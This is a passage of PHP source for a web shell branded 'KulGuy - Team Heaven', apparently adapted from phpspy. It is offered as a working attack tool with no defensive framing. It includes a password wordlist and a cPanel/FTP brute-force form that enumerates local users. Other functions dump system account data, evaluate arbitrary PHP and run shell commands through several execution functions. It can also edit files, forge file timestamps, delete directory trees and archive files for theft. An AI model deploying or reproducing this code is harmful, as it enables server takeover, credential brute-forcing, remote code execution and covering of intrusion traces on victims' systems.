engineer
itnoaloj
elelectr
thanaloj
mundoima
duymovie
thptlamh
skgentk
gaulontk
vietstim
skyitalo
tmvpnalo
tuoitred
hmobilet
mueditor
vietnamt
cbsaloja
trangxi1
teamgame
teenualo
vfeatsal
pjsantia
anhdtalo
hoctapal
imjualoj
songthan
xingzitk
babyaloj
thichnha
auxietal
mcmaloja
minhphat
alertrav
captchan
tuongthi
soalojam
phimalo1
allyoual
samycana
phimupal
freinetw
myfrien2
wapvanho
mthongti
passw0rds";
if($target == ''){
$target = 'localhost';
}
print " <div align='center'>
<form method='post' style='border: 1px solid #000000'><br><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#966117 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#966117 border=1><tr><td>
<b> Target  : </font><input type='text' name='target' size='16' value= $target style='border: font-family:tahoma; font-weight:bold;'></p></font></b></p>
<div align='center'><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#966117 cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#966117 border=1>
<tr>
<td align='center'>
<b>Username</b></td>
<td>
<p align='center'>
<b>Password</b></td>
</tr>
</table>
<p align='center'>
<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>";
$i = 0;
while ($i < 60000) {

    $line = posix_getpwuid($i);
    if (!empty($line)) {

        while (list ($key, $vba_etcpwd) = each($line)){
            echo "".$vba_etcpwd."\n";
            break;
        }

    }

   $i++;
}
echo "
</textarea>
<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$passlist</textarea><br>
<br>
<b>Options : </span><input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel
<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp ==> <input type='submit' value='Attack' name='submit' ></p>
</td></tr></table></td></tr></form><p align= 'left'>";
?>
<?php
function ftp_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {

print "<b> Error : Connection timed out , make confidence about validation of target !</b>";
exit;}

elseif ( curl_errno($ch) == 0 ){

p("<b>[LiuShiShi]# </b>
<b> Attacking has been done! Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font> => <a href=http://$user:$pass@$host:2082 target=_blank>Login</a></b><br>");
}
curl_close($ch);}

function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {
print "<b> Error : Connection timed out , make confidence about validation of target !</b>";
exit;}
elseif ( curl_errno($ch) == 0 ){

p("<b>[LiuShiShi]# </b><b>Attacking has been done!</a> Username: <font color='#FF0000'> $user </font> / Password:<font color='#FF0000'> $pass </font></b><br>");}curl_close($ch);}

if(isset($submit) && !empty($submit)){

$userlist = explode ("\n" , $users );
$passlist = explode ("\n" , $pass );
p('<b>[KulGuy] ]# Attacking ...</font></b><br>');
foreach ($userlist as $user) {
$_user = trim($user);
foreach ($passlist as $password ) {
$_pass = trim($password);
if($option == "ftp"){
ftp_check($target,$_user,$_pass,$connect_timeout);
}
if ($option == "cpanel")
{
cpanel_check($target,$_user,$_pass,$connect_timeout);
}
}
}
}

    formfoot();
}






elseif ($action == 'etcpwd') {
formhead(array('title'=>'Get /etc/passwd'));
    makehide('action','etcpwd');
    makehide('dir',$nowpath);
$i = 0;
 echo "<p><br><textarea class=\"area\" id=\"phpcodexxx\" name=\"phpcodexxx\" cols=\"100\" rows=\"25\">";
while ($i < 60000) {

    $line = posix_getpwuid($i);
    if (!empty($line)) {

        while (list ($key, $vba_etcpwd) = each($line)){
            echo "".$vba_etcpwd."\n";
            break;
        }

    }

   $i++;
}
  echo "</textarea></p>";
    formfoot();
}

elseif ($action == 'eval') {
    $phpcode = trim($phpcode);
    if($phpcode){
        if (!preg_match('#<\?#si', $phpcode)) {
            $phpcode = "<?php\n\n{$phpcode}\n\n?>";
        }
        eval("?".">$phpcode<?");
    }
    formhead(array('title'=>'Eval PHP Code'));
    makehide('action','eval');
    maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
    p('<p><a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">Get plugins</a></p>');
    formfooter();
}//end eval

elseif ($action == 'editfile') {
    if(file_exists($opfile)) {
        $fp=@fopen($opfile,'r');
        $contents=@fread($fp, filesize($opfile));
        @fclose($fp);
        $contents=htmlspecialchars($contents);
    }
    formhead(array('title'=>'Create / Edit File'));
    makehide('action','file');
    makehide('dir',$nowpath);
    makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
    maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
    formfooter();
}//end editfile

elseif ($action == 'newtime') {
    $opfilemtime = @filemtime($opfile);
    //$time = strtotime("$year-$month-$day $hour:$minute:$second");
    $cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
    formhead(array('title'=>'Clone file was last modified time'));
    makehide('action','file');
    makehide('dir',$nowpath);
    makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
    makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
    formfooter();
    formhead(array('title'=>'Set last modified'));
    makehide('action','file');
    makehide('dir',$nowpath);
    makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
    p('<p>Instead &raquo;');
    p('year:');
    makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
    p('month:');
    makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
    p('day:');
    makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
    p('hour:');
    makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
    p('minute:');
    makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
    p('second:');
    makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
    p('</p>');
    formfooter();
}//end newtime

elseif ($action == 'shell') {
    if (IS_WIN && IS_COM) {
        if($program && $parameter) {
            $shell= new COM('Shell.Application');
            $a = $shell->ShellExecute($program,$parameter);
            m('Program run has '.(!$a ? 'success' : 'fail'));
        }
        !$program && $program = 'c:\windows\system32\cmd.exe';
        !$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
        formhead(array('title'=>'Execute Program'));
        makehide('action','shell');
        makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
        p('<p>');
        makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
        makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
        p('</p>');
        formfoot();
    }
    formhead(array('title'=>'Execute Command'));
    makehide('action','shell');
    if (IS_WIN && IS_COM) {
        $execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
        makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
    }
    p('<p>');
    makeinput(array('title'=>'Command','name'=>'command','value'=>$command));
    makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
    p('</p>');
    formfoot();

    if ($command) {
        p('<hr width="100%" noshade /><pre>');
        if ($execfunc=='wscript' && IS_WIN && IS_COM) {
            $wsh = new COM('WScript.shell');
            $exec = $wsh->exec('cmd.exe /c '.$command);
            $stdout = $exec->StdOut();
            $stroutput = $stdout->ReadAll();
            echo $stroutput;
        } elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
            $descriptorspec = array(
               0 => array('pipe', 'r'),
               1 => array('pipe', 'w'),
               2 => array('pipe', 'w')
            );
            $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
            if (is_resource($process)) {
                fwrite($pipes[0], $command."\r\n");
                fwrite($pipes[0], "exit\r\n");
                fclose($pipes[0]);
                while (!feof($pipes[1])) {
                    echo fgets($pipes[1], 1024);
                }
                fclose($pipes[1]);
                while (!feof($pipes[2])) {
                    echo fgets($pipes[2], 1024);
                }
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            echo(execute($command));
        }
        p('</pre>');
    }
}//end shell

elseif ($action == 'phpenv') {
    $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    !$dis_func && $dis_func = 'No';
    $info = array(
        1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
        2 => array('Server Domain',$_SERVER['SERVER_NAME']),
        3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
        4 => array('Server OS',PHP_OS),
        5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
        6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
        7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
        8 => array('PHP run mode',strtoupper(php_sapi_name())),
        9 => array('The file path',__FILE__),

        10 => array('PHP Version',PHP_VERSION),
        11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No')),
        12 => array('Safe Mode',getcfg('safe_mode')),
        13 => array('Administrator',$adminmail),
        14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
        15 => array('enable_dl',getcfg('enable_dl')),
        16 => array('display_errors',getcfg('display_errors')),
        17 => array('register_globals',getcfg('register_globals')),
        18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
        19 => array('memory_limit',getcfg('memory_limit')),
        20 => array('post_max_size',getcfg('post_max_size')),
        21 => array('upload_max_filesize',$upsize),
        22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
        23 => array('disable_functions',$dis_func),
    );

    if($phpvarname) {
        m($phpvarname .' : '.getcfg($phpvarname));
    }

    formhead(array('title'=>'Server environment'));
    makehide('action','phpenv');
    makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
    formfooter();

    $hp = array(0=> 'Server', 1=> 'PHP');
    for($a=0;$a<2;$a++) {
        p('<h2>'.$hp[$a].' &raquo;</h2>');
        p('<ul class="info">');
        if ($a==0) {
            for($i=1;$i<=9;$i++) {
                p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
            }
        } elseif ($a == 1) {
            for($i=10;$i<=23;$i++) {
                p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
            }
        }
        p('</ul>');
    }
}//end phpenv

else {
    m('Undefined Action');
}

?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
    <span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
    Copyright (C) 2013 <B>[1111]</B> - Edit by <a href="http://" target="_blank"><B>KG</B></a> - <B>Team Heaven</B> All Rights Reserved.
</div>
</body>
</html>

<?php

/*======================================================
Show info shell
======================================================*/

function m($msg) {
    echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
    echo $msg;
    echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
    global $admin, $timestamp, $_SERVER;
    $key = ($prefix ? $admin['cookiepre'] : '').$key;
    $life = $life ? $life : $admin['cookielife'];
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
    setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}
function multi($num, $perpage, $curpage, $tablename) {
    $multipage = '';
    if($num > $perpage) {
        $page = 10;
        $offset = 5;
        $pages = @ceil($num / $perpage);
        if($page > $pages) {
            $from = 1;
            $to = $pages;
        } else {
            $from = $curpage - $offset;
            $to = $curpage + $page - $offset - 1;
            if($from < 1) {
                $to = $curpage + 1 - $from;
                $from = 1;
                if(($to - $from) < $page && ($to - $from) < $pages) {
                    $to = $page;
                }
            } elseif($to > $pages) {
                $from = $curpage - $pages + $to;
                $to = $pages;
                if(($to - $from) < $page && ($to - $from) < $pages) {
                    $from = $pages - $page + 1;
                }
            }
        }
        $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
        for($i = $from; $i <= $to; $i++) {
            $multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
        }
        $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
        $multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
    }
    return $multipage;
}
// Login page
function loginpage() {
?>
<html>
<head>

<body bgcolor=black background=http://i.imgur.com/UIOvtY8.jpg?1>

        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>KulGuy - Team Heaven</title>
<style type="text/css">
A:link {text-decoration: none; color: green }
A:visited {text-decoration: none;color:red}
A:active {text-decoration: none}
A:hover {text-decoration: underline; color: green;}
input, textarea, button
{
    font-size: 9pt;
    color: #ccc;
    font-family: verdana, sans-serif;
    background-color: #202020;
    border-left: 1px solid #74A202;
    border-top: 1px solid #74A202;
    border-right: 1px solid #74A202;
    border-bottom: 1px solid #74A202;
}

</style>
<center>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
	<td align="center" rowspan=2>
		<b><font size="5"><font color=red>o---[  <font color=#ff9900></font> <font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>KulGuy</font>  ]---o</font></a><BR></b>
</font></b>
	</td>

	<td>
		<font face="Verdana" size="2"><font color="red">Shell By KG - Team Heaven</font>
	</td>
	<td><font color=red>Server IP:</font> <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> | <font color=yellow>Your IP: <font color="#000000"><?php echo "".$_SERVER['REMOTE_ADDR']."</font>";?></font>
	</td>

</tr>
<tr>
<td colspan="3"><font face="Verdana" size="2">
<font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>Nothing To Say About Me But Something There To Be Say About Me :D </font>
</center>
</table>

       <BR><BR>
<div align=center >
<fieldset style="border: 1px solid rgb(69, 69, 69); padding: 4px;width:600px;bgcolor:white;align:center;font-family:tahoma;font-size:10pt"><legend><font color=red><B>Please Log In here</b></font></legend>

<div>
<font color=gray>
<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
<table align="center" border="1" width="600" heigh>
<tbody><tr>
<td valign="top" background=""><p id="hack" style="margin-left: 3px;">
<font color="#009900"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"> Trying connect to Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">~\$</font> Connected ! </font><br>
<font color="#009900"><font color="#FFF000"><?php echo "".$_SERVER['HTTP_HOST']."";?></font> Checking Server . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"><font color="#FFF000"><?php echo "".$_SERVER['HTTP_HOST']."";?></font> Trying connect to Command . . . . . . . . . . .</font><br>

<font color="#F00000"><font color="#FFF000"><?php echo "".$_SERVER['HTTP_HOST']."";?></font> Connected Command! </font><br>
<font color="#009900"><font color="#FFF000"><?php echo "".$_SERVER['HTTP_HOST']."";?><font color="#F00000"></font></font> OK! You can kill it!</font>
</tr>
</tbody></table>
<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();

</script>
<form method="POST" action="">
    <span style="font:10pt tahoma;">Password: </span><input name="password" type="password" size="20">
    <input type="hidden" name="doing" value="login">
    <input type="submit" value="Login Now">
    </form>
<BR>
<?php
echo "".$err_mess."";
?>

    <B><font color=red>
<font color=red>o---[  <font color=#ff9900>Edit by </font> <font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>KulGuy</font>  ]---o</font></a><BR></b>





</div>


    </fieldset>



</head>
</html>


<?php
    exit;

}//end loginpage()

function execute($cfe) {
    $res = '';
    if ($cfe) {
        if(function_exists('exec')) {
            @exec($cfe,$res);
            $res = join("\n",$res);
        } elseif(function_exists('shell_exec')) {
            $res = @shell_exec($cfe);
        } elseif(function_exists('system')) {
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(function_exists('passthru')) {
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif(@is_resource($f = @popen($cfe,"r"))) {
            $res = '';
            while(!@feof($f)) {
                $res .= @fread($f,1024);
            }
            @pclose($f);
        }
    }
    return $res;
}
function which($pr) {
    $path = execute("which $pr");
    return ($path ? $path : $pr);
}

function cf($fname,$text){
    if($fp=@fopen($fname,'w')) {
        @fputs($fp,@base64_decode($text));
        @fclose($fp);
    }
}

// Debug
function debuginfo() {
    global $starttime;
    $mtime = explode(' ', microtime());
    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
    echo 'Processed in '.$totaltime.' second(s)';
}

// Function connect database
function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
    if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
        p('<h2>Can not connect to MySQL server</h2>');
        exit;
    }
    if($link && $dbname) {
        if (!@mysql_select_db($dbname, $link)) {
            p('<h2>Database selected has error</h2>');
            exit;
        }
    }
    if($link && mysql_get_server_info() > '4.1') {
        if(in_array(strtolower($charset), array('gbk', 'big5', 'utf8'))) {
            q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
        }
    }
    return $link;
}

// Array strip
function s_array(&$array) {
    if (is_array($array)) {
        foreach ($array as $k => $v) {
            $array[$k] = s_array($v);
        }
    } else if (is_string($array)) {
        $array = stripslashes($array);
    }
    return $array;
}

// HTML Strip
function html_clean($content) {
    $content = htmlspecialchars($content);
    $content = str_replace("\n", "<br />", $content);
    $content = str_replace("  ", "&nbsp;&nbsp;", $content);
    $content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
    return $content;
}

// Chmod
function getChmod($filepath){
    return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
    $mode = @fileperms($filepath);
    if (($mode & 0xC000) === 0xC000) {$type = 's';}
    elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
    elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
    elseif (($mode & 0x8000) === 0x8000) {$type = '-';}
    elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
    elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
    elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
    else {$type = '?';}

    $owner['read'] = ($mode & 00400) ? 'r' : '-';
    $owner['write'] = ($mode & 00200) ? 'w' : '-';
    $owner['execute'] = ($mode & 00100) ? 'x' : '-';
    $group['read'] = ($mode & 00040) ? 'r' : '-';
    $group['write'] = ($mode & 00020) ? 'w' : '-';
    $group['execute'] = ($mode & 00010) ? 'x' : '-';
    $world['read'] = ($mode & 00004) ? 'r' : '-';
    $world['write'] = ($mode & 00002) ? 'w' : '-';
    $world['execute'] = ($mode & 00001) ? 'x' : '-';

    if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
    if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
    if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}

    return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)    {
    if (function_exists('posix_getpwuid')) {
        $array = @posix_getpwuid(@fileowner($filepath));
        if ($array && is_array($array)) {
            return ' / <a href="#" title="User: '.$array['name'].'
Passwd: '.$array['passwd'].'
Uid: '.$array['uid'].'
gid: '.$array['gid'].'
Gecos: '.$array['gecos'].'
Dir: '.$array['dir'].'
Shell: '.$array['shell'].'">'.$array['name'].'</a>';
        }
    }
    return '';
}

// Delete dir
function deltree($deldir) {
    $mydir=@dir($deldir);
    while($file=$mydir->read())    {
        if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) {
            @chmod($deldir.'/'.$file,0777);
            deltree($deldir.'/'.$file);
        }
        if (is_file($deldir.'/'.$file)) {
            @chmod($deldir.'/'.$file,0777);
            @unlink($deldir.'/'.$file);
        }
    }
    $mydir->close();
    @chmod($deldir,0777);
    return @rmdir($deldir) ? 1 : 0;
}

// Background
function bg() {
    global $bgc;
    return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// Get path
function getPath($scriptpath, $nowpath) {
    if ($nowpath == '.') {
        $nowpath = $scriptpath;
    }
    $nowpath = str_replace('\\', '/', $nowpath);
    $nowpath = str_replace('//', '/', $nowpath);
    if (substr($nowpath, -1) != '/') {
        $nowpath = $nowpath.'/';
    }
    return $nowpath;
}

// Get up path
function getUpPath($nowpath) {
    $pathdb = explode('/', $nowpath);
    $num = count($pathdb);
    if ($num > 2) {
        unset($pathdb[$num-1],$pathdb[$num-2]);
    }
    $uppath = implode('/', $pathdb).'/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}

// Config
function getcfg($varname) {
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'No';
    } elseif ($result == 1) {
        return 'Yes';
    } else {
        return $result;
    }
}

// Function name
function getfun($funName) {
    return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

function GetList($dir){
    global $dirdata,$j,$nowpath;
    !$j && $j=1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $f=str_replace('//','/',$dir.'/'.$file);
            if($file!='.' && $file!='..' && is_dir($f)){
                if (is_writable($f)) {
                    $dirdata[$j]['filename']=str_replace($nowpath,'',$f);
                    $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                    $dirdata[$j]['dirchmod']=getChmod($f);
                    $dirdata[$j]['dirperm']=getPerms($f);
                    $dirdata[$j]['dirlink']=ue($dir);
                    $dirdata[$j]['server_link']=$f;
                    $dirdata[$j]['client_link']=ue($f);
                    $j++;
                }
                GetList($f);
            }
        }
        closedir($dh);
        clearstatcache();
        return $dirdata;
    } else {
        return array();
    }
}

function qy($sql) {
    //echo $sql.'<br>';
    $res = $error = '';
    if(!$res = @mysql_query($sql)) {
        return 0;
    } else if(is_resource($res)) {
        return 1;
    } else {
        return 2;
    }
    return 0;
}

function q($sql) {
    return @mysql_query($sql);
}

function fr($qy){
    mysql_free_result($qy);
}

function sizecount($size) {
    if($size > 1073741824) {
        $size = round($size / 1073741824 * 100) / 100 . ' G';
    } elseif($size > 1048576) {
        $size = round($size / 1048576 * 100) / 100 . ' M';
    } elseif($size > 1024) {
        $size = round($size / 1024 * 100) / 100 . ' K';
    } else {
        $size = $size . ' B';
    }
    return $size;
}

// Zip
class PHPZip{
    var $out='';
    function PHPZip($dir)    {
        if (@function_exists('gzcompress'))    {
            $curdir = getcwd();
            if (is_array($dir)) $filelist = $dir;
            else{
                $filelist=$this -> GetFileList($dir);//File list
                foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
            }
            if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
            else chdir($curdir);
            if (count($filelist)>0){
                foreach($filelist as $filename){
                    if (is_file($filename)){
                        $fd = fopen ($filename, 'r');
                        $content = @fread ($fd, filesize($filename));
                        fclose ($fd);
                        if (is_array($dir)) $filename = basename($filename);
                        $this -> addFile($content, $filename);
                    }
                }
                $this->out = $this -> file();
                chdir($curdir);
            }
            return 1;
        }
        else return 0;
    }

    // Show file list
    function GetFileList($dir){
        static $a;
        if (is_dir($dir)) {
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    if($file!='.' && $file!='..'){
                        $f=$dir .'/'. $file;
                        if(is_dir($f)) $this->GetFileList($f);
                        $a[]=$f;
                    }
                }
                closedir($dh);
            }
        }
        return $a;
    }

    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } // end if
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

    function addFile($data, $name, $time = 0) {
        $name = str_replace('\\', '/', $name);

        $dtime = dechex($this->unix2DosTime($time));
        $hexdtime    = '\x' . $dtime[6] . $dtime[7]
                    . '\x' . $dtime[4] . $dtime[5]
                    . '\x' . $dtime[2] . $dtime[3]
                    . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr    = "\x50\x4b\x03\x04";
        $fr    .= "\x14\x00";
        $fr    .= "\x00\x00";
